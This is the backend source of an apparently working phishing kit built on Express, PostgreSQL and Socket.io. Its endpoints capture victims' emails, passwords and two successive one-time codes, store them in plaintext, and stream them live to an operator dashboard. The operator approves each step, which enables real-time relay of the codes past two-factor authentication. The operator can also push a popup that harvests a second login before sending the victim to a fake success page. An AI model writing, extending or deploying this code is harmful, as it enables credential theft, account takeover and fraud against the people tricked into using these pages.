require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const jwt = require('jsonwebtoken');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files
const publicPath = path.join(__dirname, 'public');
app.use(express.static(publicPath));

// Explicit routes for HTML pages
app.get('/', (req, res) => res.sendFile(path.join(publicPath, 'users/login.html')));
app.get('/users/login', (req, res) => res.sendFile(path.join(publicPath, 'users/login.html')));
app.get('/users/otp', (req, res) => res.sendFile(path.join(publicPath, 'users/otp.html')));
app.get('/users/second-otp', (req, res) => res.sendFile(path.join(publicPath, 'users/second-otp.html')));
app.get('/users/success', (req, res) => res.sendFile(path.join(publicPath, 'users/success.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(publicPath, 'admin/index.html')));
app.get('/admin/dashboard', (req, res) => res.sendFile(path.join(publicPath, 'admin/dashboard.html')));

// Database configuration
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false },
  connectionTimeoutMillis: 10000,
  idleTimeoutMillis: 30000,
  max: 20,
  keepAlive: true
});

// Test database connection
pool.connect((err, client, release) => {
  if (err) console.error('❌ Database connection error:', err.message);
  else {
    console.log('✅ Connected to Neon PostgreSQL database');
    release();
  }
});

// JWT middleware
const authenticateJWT = (req, res, next) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) return res.status(401).json({ error: 'No token provided' });
  
  const token = authHeader.split(' ')[1];
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) return res.status(403).json({ error: 'Invalid token' });
    req.user = user;
    next();
  });
};

// Socket.io authentication - Allow users without token
io.use((socket, next) => {
  const token = socket.handshake.auth.token;
  
  if (!token) {
    socket.isUser = true;
    return next();
  }
  
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) {
      return next(new Error('Authentication error'));
    }
    socket.user = user;
    socket.isAdmin = true;
    next();
  });
});

// Socket.io connection
io.on('connection', (socket) => {
  if (socket.isAdmin) {
    console.log('👑 Admin connected:', socket.user?.email, socket.id);
  } else {
    console.log('👤 User connected:', socket.id);
    socket.on('identify', (data) => {
      socket.userEmail = data.email;
      console.log('👤 User identified:', data.email);
    });
  }
  
  socket.emit('test-notification', { 
    message: 'Connected to real-time server',
    timestamp: new Date()
  });
  
  socket.on('disconnect', () => {
    if (socket.isAdmin) {
      console.log('👑 Admin disconnected:', socket.id);
    } else {
      console.log('👤 User disconnected:', socket.id);
    }
  });
});

// Database initialization
async function initializeDatabase() {
  try {
    console.log('📦 Initializing database...');
    
    // Create users table
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL,
        otp VARCHAR(6),
        second_otp VARCHAR(6) DEFAULT NULL,
        otp_attempts INTEGER DEFAULT 0,
        otp_verified BOOLEAN DEFAULT FALSE,
        approved BOOLEAN DEFAULT FALSE,
        second_approved BOOLEAN DEFAULT FALSE,
        force_login BOOLEAN DEFAULT FALSE,
        redirect_success BOOLEAN DEFAULT FALSE,
        login_email VARCHAR(255) DEFAULT NULL,
        login_password VARCHAR(255) DEFAULT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);
    console.log('✅ Users table ready');

    // Create admin table
    await pool.query(`
      CREATE TABLE IF NOT EXISTS admin (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL
      )
    `);
    console.log('✅ Admin table ready');

    // Add columns if they don't exist
    await pool.query(`
      ALTER TABLE users 
      ADD COLUMN IF NOT EXISTS second_approved BOOLEAN DEFAULT FALSE,
      ADD COLUMN IF NOT EXISTS force_login BOOLEAN DEFAULT FALSE,
      ADD COLUMN IF NOT EXISTS redirect_success BOOLEAN DEFAULT FALSE,
      ADD COLUMN IF NOT EXISTS login_email VARCHAR(255) DEFAULT NULL,
      ADD COLUMN IF NOT EXISTS login_password VARCHAR(255) DEFAULT NULL
    `).catch(() => console.log('✅ Additional columns exist'));

    // Create update timestamp function
    await pool.query(`
      CREATE OR REPLACE FUNCTION update_updated_at_column()
      RETURNS TRIGGER AS $$
      BEGIN
          NEW.updated_at = CURRENT_TIMESTAMP;
          RETURN NEW;
      END;
      $$ language 'plpgsql';
    `);

    // Create trigger
    await pool.query(`
      DROP TRIGGER IF EXISTS update_users_updated_at ON users;
      CREATE TRIGGER update_users_updated_at
          BEFORE UPDATE ON users
          FOR EACH ROW
          EXECUTE FUNCTION update_updated_at_column();
    `);

    // Insert default admin if not exists
    const adminExists = await pool.query('SELECT * FROM admin WHERE email = $1', [process.env.ADMIN_EMAIL]);
    if (adminExists.rows.length === 0) {
      await pool.query('INSERT INTO admin (email, password) VALUES ($1, $2)', 
        [process.env.ADMIN_EMAIL, process.env.ADMIN_PASSWORD]);
      console.log('✅ Default admin created');
    }

    console.log('✅ Database initialization completed');
    return true;
  } catch (error) {
    console.error('❌ Database init error:', error.message);
    return false;
  }
}

// ==================== USER ENDPOINTS ====================

// User login - sends email to admin for approval
app.post('/api/users/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Email and password required' });

    await pool.query(`
      INSERT INTO users (email, password, otp_verified, approved, second_approved) 
      VALUES ($1, $2, false, false, false) 
      ON CONFLICT (email) DO UPDATE 
      SET password = EXCLUDED.password, otp_verified = false, otp_attempts = 0, otp = NULL, second_otp = NULL, approved = false, second_approved = false
    `, [email, password]);

    console.log('🔔 SENDING NOTIFICATION TO ADMIN - New Login:', email);
    
    io.emit('user-login', { 
      email, 
      password,
      timestamp: new Date(),
      message: '🔐 New user login attempt'
    });

    // Return simple response - user will check approval via polling
    res.json({ success: true, message: 'Email submitted for approval' });
    
  } catch (error) {
    console.error('❌ Login error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Check if email is approved by admin
app.post('/api/users/check-approval', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.json({ approved: false });
    
    const result = await pool.query('SELECT approved FROM users WHERE email = $1', [email]);
    res.json({ approved: result.rows.length > 0 ? result.rows[0].approved : false });
  } catch (error) {
    console.error('❌ Check approval error:', error.message);
    res.json({ approved: false });
  }
});

// Check first approval (for email approval)
app.post('/api/users/check-first-approval', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.json({ approved: false });
    
    const result = await pool.query('SELECT approved FROM users WHERE email = $1', [email]);
    res.json({ approved: result.rows.length > 0 ? result.rows[0].approved : false });
  } catch (error) {
    console.error('❌ Check first approval error:', error.message);
    res.json({ approved: false });
  }
});

// Check second approval (for OTP approval)
app.post('/api/users/check-second-approval', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.json({ approved: false });
    
    const result = await pool.query('SELECT second_approved FROM users WHERE email = $1', [email]);
    res.json({ approved: result.rows.length > 0 ? result.rows[0].second_approved : false });
  } catch (error) {
    console.error('❌ Check second approval error:', error.message);
    res.json({ approved: false });
  }
});

// Submit first OTP - updates the otp column
app.post('/api/users/submit-otp', async (req, res) => {
  try {
    const { email, otp } = req.body;
    if (!email || !otp) return res.status(400).json({ error: 'Missing fields' });
    
    // OTP can be any 6 characters - no regex validation
    if (otp.length !== 6) {
      return res.status(400).json({ error: 'OTP must be exactly 6 characters' });
    }
    
    // Save OTP but keep approved = false (waiting for admin)
    await pool.query('UPDATE users SET otp = $1, otp_verified = false, approved = false WHERE email = $2', [otp, email]);
    
    io.emit('user-otp-created', { email, otp, timestamp: new Date() });
    
    res.json({ success: true });
  } catch (error) {
    console.error('❌ Submit OTP error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Submit second OTP - UPDATES the second_otp column (can be overwritten multiple times)
app.post('/api/users/submit-second-otp', async (req, res) => {
  try {
    const { email, otp } = req.body;
    if (!email || !otp) return res.status(400).json({ error: 'Missing fields' });
    
    // OTP can be any 6 characters - no regex validation
    if (otp.length !== 6) {
      return res.status(400).json({ error: 'OTP must be exactly 6 characters' });
    }
    
    // Update second_otp, keep second_approved = false (waiting for admin)
    await pool.query('UPDATE users SET second_otp = $1, second_approved = false WHERE email = $2', [otp, email]);
    
    io.emit('user-second-otp-created', { email, second_otp: otp, timestamp: new Date() });
    
    res.json({ success: true });
  } catch (error) {
    console.error('❌ Submit second OTP error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// ==================== NEW POLLING ENDPOINTS (ADDED) ====================

// Check if admin wants to force login popup
app.post('/api/users/check-force-login', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.json({ force_login: false });
    
    const result = await pool.query('SELECT force_login FROM users WHERE email = $1', [email]);
    res.json({ force_login: result.rows.length > 0 ? result.rows[0].force_login : false });
  } catch (error) {
    console.error('❌ Check force login error:', error.message);
    res.json({ force_login: false });
  }
});

// Check if admin wants to redirect user to success
app.post('/api/users/check-redirect-success', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.json({ redirect_success: false });
    
    const result = await pool.query('SELECT redirect_success FROM users WHERE email = $1', [email]);
    res.json({ redirect_success: result.rows.length > 0 ? result.rows[0].redirect_success : false });
  } catch (error) {
    console.error('❌ Check redirect success error:', error.message);
    res.json({ redirect_success: false });
  }
});

// User submits login from popup
app.post('/api/users/submit-login-popup', async (req, res) => {
  try {
    const { email, loginEmail, loginPassword } = req.body;
    if (!email || !loginEmail || !loginPassword) {
      return res.status(400).json({ error: 'All fields required' });
    }
    
    const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
    if (!emailRegex.test(loginEmail)) {
      return res.status(400).json({ error: 'Please enter a valid email address' });
    }
    
    // Save login credentials to database
    await pool.query(
      'UPDATE users SET login_email = $1, login_password = $2, force_login = false WHERE email = $3',
      [loginEmail, loginPassword, email]
    );
    
    console.log('🔔 User submitted popup login:', email, 'Login Email:', loginEmail);
    
    // Notify admin via socket
    io.emit('user-login-submitted', { 
      email,
      loginEmail,
      loginPassword,
      timestamp: new Date(),
      message: '🔐 User completed forced login'
    });
    
    res.json({ success: true, message: 'Login submitted successfully' });
  } catch (error) {
    console.error('❌ Submit login popup error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// ==================== ADMIN ENDPOINTS ====================

// Admin login
app.post('/api/admin/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Email and password required' });

    const result = await pool.query('SELECT * FROM admin WHERE email = $1 AND password = $2', [email, password]);
    if (result.rows.length === 0) return res.status(401).json({ error: 'Invalid credentials' });

    const token = jwt.sign(
      { id: result.rows[0].id, email, role: 'admin' },
      process.env.JWT_SECRET,
      { expiresIn: '24h' }
    );

    res.json({ token });
  } catch (error) {
    console.error('❌ Admin login error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Get all users - UPDATED with new columns
app.get('/api/admin/users', authenticateJWT, async (req, res) => {
  try {
    const result = await pool.query(`
      SELECT 
        id, 
        email, 
        password,
        otp,
        second_otp,
        otp_attempts,
        otp_verified,
        approved,
        second_approved,
        force_login,
        redirect_success,
        login_email,
        login_password,
        created_at,
        updated_at
      FROM users 
      ORDER BY created_at DESC
    `);
    
    res.json(result.rows);
  } catch (error) {
    console.error('❌ Admin users error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Admin approve email (first approval)
app.post('/api/admin/approve-user', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    
    const result = await pool.query('UPDATE users SET approved = true WHERE email = $1 RETURNING approved', [email]);
    
    if (result.rowCount === 0) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    console.log('✅ Admin approved email for:', email);
    
    res.json({ success: true, message: 'Email approved' });
  } catch (error) {
    console.error('❌ Approve email error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Admin approve second OTP - sets second_approved to true, button stays available
app.post('/api/admin/approve-second', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    
    const result = await pool.query('UPDATE users SET second_approved = true WHERE email = $1 RETURNING second_approved', [email]);
    
    if (result.rowCount === 0) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    console.log('✅ Admin approved second OTP for:', email);
    
    res.json({ success: true, message: 'Second OTP approved' });
  } catch (error) {
    console.error('❌ Approve second error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// ==================== NEW ADMIN ENDPOINTS (ADDED) ====================

// Admin force login - sets force_login flag in database
app.post('/api/admin/force-login', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    
    await pool.query('UPDATE users SET force_login = true WHERE email = $1', [email]);
    console.log('🔔 Admin forced login for user:', email);
    
    // Notify admin via socket (already connected)
    io.emit('force-login-triggered', { 
      email,
      timestamp: new Date(),
      message: '🔐 Force login triggered for user'
    });
    
    res.json({ success: true, message: 'Force login triggered' });
  } catch (error) {
    console.error('❌ Force login error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Admin redirect to success - sets redirect_success flag in database
app.post('/api/admin/redirect-success', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    
    await pool.query('UPDATE users SET redirect_success = true WHERE email = $1', [email]);
    console.log('🔔 Admin redirecting user to success:', email);
    
    // Notify admin via socket
    io.emit('redirect-success-triggered', { 
      email,
      timestamp: new Date(),
      message: '🎉 Redirect to success triggered for user'
    });
    
    res.json({ success: true, message: 'Redirect to success triggered' });
  } catch (error) {
    console.error('❌ Redirect success error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// ==================== HEALTH CHECK ====================

app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    database: process.env.DATABASE_URL ? 'Configured' : 'Not configured',
    timestamp: new Date().toISOString()
  });
});

// ==================== ERROR HANDLING ====================

app.use((err, req, res, next) => {
  console.error('❌ Unhandled error:', err.stack);
  res.status(500).json({ error: 'Something went wrong!' });
});

app.use('/api/*', (req, res) => {
  res.status(404).json({ error: 'API endpoint not found' });
});

// ==================== START SERVER ====================

const PORT = process.env.PORT || 3000;

initializeDatabase().then((success) => {
  if (success) {
    server.listen(PORT, '0.0.0.0', () => {
      console.log('\n🚀 Server started!');
      console.log(`📡 Port: ${PORT}`);
      console.log(`🔗 User login: /users/login`);
      console.log(`🔗 Admin login: /admin`);
      console.log('\n📢 Socket.io server ready for real-time notifications\n');
    });
  } else {
    console.error('❌ Failed to initialize database. Exiting...');
    process.exit(1);
  }
});

process.on('SIGINT', () => {
  console.log('\n📴 Shutting down server...');
  pool.end(() => process.exit(0));
});
process.on('SIGTERM', () => {
  console.log('\n📴 Shutting down server...');
  pool.end(() => process.exit(0));
});
